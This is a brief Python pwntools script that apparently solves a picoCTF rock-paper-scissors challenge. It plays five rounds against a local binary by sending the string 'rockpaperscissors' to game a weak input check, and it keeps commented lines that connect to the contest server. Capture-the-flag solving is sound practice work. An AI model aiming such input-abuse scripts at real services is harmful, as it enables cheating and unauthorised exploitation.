from pwn import *
# p = remote('saturn.picoctf.net', 52524)
# nc saturn.picoctf.net 53865
p = process("./RPS")


for i in range(0, 5):
	p.recvuntil("program")
	p.sendline("1")
	p.recvuntil("):") 
	p.sendline("rockpaperscissors")

p.interactive()


